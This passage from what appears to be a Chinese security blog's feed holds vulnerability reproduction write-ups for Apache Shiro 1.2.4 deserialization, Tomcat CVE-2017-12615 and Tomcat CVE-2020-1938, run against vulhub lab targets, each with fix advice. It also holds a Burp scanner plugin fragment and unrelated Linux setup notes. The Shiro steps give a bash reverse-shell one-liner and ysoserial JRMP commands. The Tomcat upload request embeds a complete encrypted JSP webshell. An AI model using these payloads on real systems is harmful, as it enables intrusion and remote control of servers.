self.get_request_host(reqHeaders)</span><br><span class="line">        reqContentType &#x3D; analyzedIRequestInfo.getContentType()</span><br><span class="line">        print(reqHost, reqPath)</span><br><span class="line">        return analyzedIRequestInfo, reqHeaders, reqBodys, reqMethod, reqParameters, reqHost, reqContentType</span><br><span class="line"></span><br><span class="line">    # 获取响应的一些信息：响应头，响应内容，响应状态码</span><br><span class="line">    def get_response_info(self, response):</span><br><span class="line">        analyzedIResponseInfo &#x3D; self._helpers.analyzeRequest(response)</span><br><span class="line">        resHeaders &#x3D; analyzedIResponseInfo.getHeaders()</span><br><span class="line">        resBodys &#x3D; response[analyzedIResponseInfo.getBodyOffset():].tostring()</span><br><span class="line">        # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。</span><br><span class="line">        # resStatusCode &#x3D; analyzedIResponseInfo.getStatusCode()</span><br><span class="line">        return resHeaders, resBodys</span><br><span class="line"></span><br><span class="line">    # 获取请求的参数名、参数值、参数类型（get、post、cookie-&gt;用来构造参数时使用）</span><br><span class="line">    def get_parameter_Name_Value_Type(self, parameter):</span><br><span class="line">        parameterName &#x3D; parameter.getName()</span><br><span class="line">        parameterValue &#x3D; parameter.getValue()</span><br><span class="line">        parameterType &#x3D; parameter.getType()</span><br><span class="line">        return parameterName, parameterValue, parameterType</span><br><span class="line"></span><br><span class="line">    def doActiveScan(self, baseRequestResponse, insertionPoint):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    def doPassiveScan(self, baseRequestResponse):</span><br><span class="line">        self.issues &#x3D; []</span><br><span class="line">        self.start_run(baseRequestResponse)</span><br><span class="line">        return self.issues</span><br><span class="line"></span><br><span class="line">    def consolidateDuplicateIssues(self, existingIssue, newIssue):</span><br><span class="line">        &#39;&#39;&#39;</span><br><span class="line">        相同的数据包，只报告一份报告</span><br><span class="line">        :param existingIssue:</span><br><span class="line">        :param newIssue:</span><br><span class="line">        :return:</span><br><span class="line">        &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">        if existingIssue.getIssueDetail() &#x3D;&#x3D; newIssue.getIssueDetail():</span><br><span class="line">            return -1</span><br><span class="line"></span><br><span class="line">        return 0</span><br></pre></td></tr></table></figure><hr><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05  漏洞利用"></a>0x05  漏洞利用</h2><p>在已有的<code>cookie</code> 值后面接 <code>;rememberMe=1</code> 如返回 <code>rememberMe=deleteMe</code> 则说明可能存在 <code>shiro</code> 漏洞</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/1.png"></p><p>1、攻击端监听 9999 端口</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/nc.png"></p><p>2、构造反弹 shell 命令，并进行 <a href="http://www.jackson-t.ca/runtime-exec-payloads.html">Base64编码</a> （如不进行 Base64编码 可能会出现问题）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.203&#x2F;9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>3、攻击端开启 JRMP（端口为：8888）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections4 &quot;【Base64 编码后的反弹 shell 命令】&quot;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/jrmp.png"></p><p>4、使用 s.py 获取 Payload（此处端口为 JRMP 的端口）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 s.py 192.168.1.203:8888</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/s.png"></p><p>5、将获取到的 Payload 到 Burp 粘贴并发送</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/bp.png"></p><p>6、此时可看到靶机已连接 JRMP</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/jrmp-2.png"></p><p>监听的 9999 端口已获取到反弹的 shell</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/nc-2.png"></p><h2 id="0x06-漏洞修复"><a href="#0x06-漏洞修复" class="headerlink" title="0x06  漏洞修复"></a>0x06  漏洞修复</h2><p>1、升级shiro到1.2.5及以上<br>2、删除代码里的默认密钥<br>3、默认配置里注释了默认密钥<br>4、如果不配置密钥，每次会重新随机一个密钥</p><h2 id="0x07-参考-URL"><a href="#0x07-参考-URL" class="headerlink" title="0x07 参考 URL"></a>0x07 参考 URL</h2><p><a href="https://www.cnblogs.com/panisme/p/12552838.html">https://www.cnblogs.com/panisme/p/12552838.html</a><br><a href="https://www.cnblogs.com/loong-hon/p/10619616.html">https://www.cnblogs.com/loong-hon/p/10619616.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00  简介&quot;&gt;&lt;/a&gt;0x00  简介&lt;/h2&gt;&lt;p&gt;Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</summary>
      
    
    
    
    <category term="Apache Shiro 漏洞复现" scheme="https://administratorrs.github.io/categories/Apache-Shiro-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://administratorrs.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Apache Shiro 漏洞复现" scheme="https://administratorrs.github.io/tags/Apache-Shiro-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Apache Tomcat CVE-2017-12615 任意文件写入漏洞复现</title>
    <link href="https://administratorrs.github.io/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/"/>
    <id>https://administratorrs.github.io/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/</id>
    <published>2021-02-10T16:00:00.000Z</published>
    <updated>2021-02-17T06:21:37.393Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p><a href="https://www.cnblogs.com/backlion/p/7590797.html">参考</a></p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Apache Tomcat 7.0.0 - 7.0.81</p><p>Apache Tomcat 8.5.19</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#  进入 vulhub 目录下的 &#x2F;tomcat&#x2F;CVE-2017-12615&#x2F; 目录</span><br><span class="line">#  启动环境</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">#  查看环境</span><br><span class="line">sudo docker ps -a</span><br><span class="line">#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））</span><br><span class="line">sudo docker exec -it 268f542b6482 bash</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、环境开启后访问页面如下</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/1.jpg"></p><p>2、在  <code>BP</code>中构造如下 <code>POC</code> 并发包（此处用的是冰蝎3.0自带的jsp码，密码为冰蝎右下角的rebeyond）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.10.233:8080</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 542</span><br><span class="line"></span><br><span class="line">AAAAA&lt;%@page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k&#x3D;&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c&#x3D;Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;bbbb</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/bp.jpg"></p><p>3、使用冰蝎进行连接</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/2.jpg"></p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/3.jpg"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>1、配置 <code>readonly</code> 和 <code>VirtualDirContext</code> 值为 <code>Ture</code> 或注释参数，临时规避安全风险</p><p>2、更新到新版本</p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/backlion/p/7590797.html">https://www.cnblogs.com/backlion/p/7590797.html</a></p><p><a href="https://vulhub.org/#/environments/tomcat/CVE-2017-12615/">https://vulhub.org/#/environments/tomcat/CVE-2017-12615/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00  简介&quot;&gt;&lt;/a&gt;0x00  简介&lt;/h2&gt;&lt;p&gt;Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系</summary>
      
    
    
    
    <category term="Apache Tomcat 漏洞复现" scheme="https://administratorrs.github.io/categories/Apache-Tomcat-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://administratorrs.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Apache Tomcat 漏洞复现" scheme="https://administratorrs.github.io/tags/Apache-Tomcat-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Apache Tomcat CVE-2020-1938 任意文件读取漏洞复现</title>
    <link href="https://administratorrs.github.io/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%206,7,8,9/CVE-2020-1938/"/>
    <id>https://administratorrs.github.io/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%206,7,8,9/CVE-2020-1938/</id>
    <published>2021-02-10T16:00:00.000Z</published>
    <updated>2021-02-17T06:21:32.708Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p><h3 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h3><p><code>Tomcat</code> 默认开启的 <code>AJP</code> 服务。端口号为 <code>8009</code>，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响 <code>Tomcat</code> 服务器 <code>webapp</code> 目录里的任意文件。</p><h3 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h3><p>Apache Tomcat 6<br>Apache Tomcat 7 &lt; 7.0.100<br>Apache Tomcat 8 &lt; 8.5.51<br>Apache Tomcat 9 &lt; 9.0.31</p><h3 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#  进入 vulhub 目录下的 &#x2F;tomcat&#x2F;CVE-2020-1938&#x2F; 目录</span><br><span class="line">#  启动环境</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">#  查看环境</span><br><span class="line">sudo docker ps -a</span><br><span class="line">#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））</span><br><span class="line">sudo docker exec -it 268f542b6482 bash</span><br></pre></td></tr></table></figure><h3 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h3><p>1、环境开启后访问如下</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%206,7,8,9/CVE-2020-1938/1.jpg"></p><p>2、进入环境目录在进入 <code>/webapps/ROOT/WEB-INF</code> 目录下创建 <code>test.txt</code> 用于测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 01 &gt; .&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;test.txt</span><br></pre></td></tr></table></figure><p>3、使用 <a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">Python</a> 脚本对文件进行读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 192.168.10.233 -f &#x2F;WEB-INF&#x2F;test.txt</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%206,7,8,9/CVE-2020-1938/2.jpg"></p><h3 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h3><p>1、临时禁用 <code>AJP</code> 协议端口，在 <code>conf/server.xml</code> 配置文件中注释掉 <code>&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;</code></p><p>2、配置 <code>ajp</code> 配置中的 <code>secretRequired</code> 跟 <code>secret</code> 属性来限制认证</p><p>3、升级到最新版</p><h3 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h3><p><a href="https://www.cnblogs.com/L0ading/p/12341112.html">https://www.cnblogs.com/L0ading/p/12341112.html</a></p><p><a href="https://www.cnblogs.com/Sylon/p/12516428.html">https://www.cnblogs.com/Sylon/p/12516428.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00  简介&quot;&gt;&lt;/a&gt;0x00  简介&lt;/h2&gt;&lt;p&gt;Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系</summary>
      
    
    
    
    <category term="Apache Tomcat 漏洞复现" scheme="https://administratorrs.github.io/categories/Apache-Tomcat-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://administratorrs.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Apache Tomcat 漏洞复现" scheme="https://administratorrs.github.io/tags/Apache-Tomcat-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>设置 JAVA 环境</title>
    <link href="https://administratorrs.github.io/2021/02/10/Linux/JAVA%E7%8E%AF%E5%A2%83/JAVA%E7%8E%AF%E5%A2%83/"/>
    <id>https://administratorrs.github.io/2021/02/10/Linux/JAVA%E7%8E%AF%E5%A2%83/JAVA%E7%8E%AF%E5%A2%83/</id>
    <published>2021-02-09T16:00:00.000Z</published>
    <updated>2021-02-11T04:43:56.955Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#  更新软件包列表</span><br><span class="line">sudo apt-get update</span><br><span class="line">#  安装 openjdk-8-jdk</span><br><span class="line">sudo apt-get install openjdk-8-jdk -y</span><br><span class="line">#  查看 java 版本</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class</summary>
      
    
    
    
    <category term="Linux" scheme="https://administratorrs.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://administratorrs.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu更换软件源</title>
    <link href="https://administratorrs.github.io/2021/02/10/Linux/ubuntu%20%E6%9B%B4%E6%8D%A2%E8%BD%AF%E4%BB%B6%E6%BA%90/%E9%85%8D%E7%BD%AE%E6%BA%90/"/>
    <id>https://administratorrs.github.io/2021/02/10/Linux/ubuntu%20%E6%9B%B4%E6%8D%A2%E8%BD%AF%E4%BB%B6%E6%BA%90/%E9%85%8D%E7%BD%AE%E6%BA%90/</id>
    <published>2021-02-09T16:00:00.000Z</published>
    <updated>2021-02-11T04:45:08.907Z</updated>
    
    <content type="html"><![CDATA[<p>备份源文件 <code>sudo cp -p /etc/apt/sources.list /etc/apt/sources.list.bak_2020.10.13</code></p><p>在 <code>/etc/apt/sources.list</code> 文件最前行添加所需源即可</p><h2 id="阿里源"><a href="#阿里源" class="headerlink" title="阿里源"></a>阿里源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><h2 id="中科大源"><a href="#中科大源" class="headerlink" title="中科大源"></a>中科大源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure><h2 id="清华源"><a href="#清华源" class="headerlink" title="清华源"></a>清华源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe 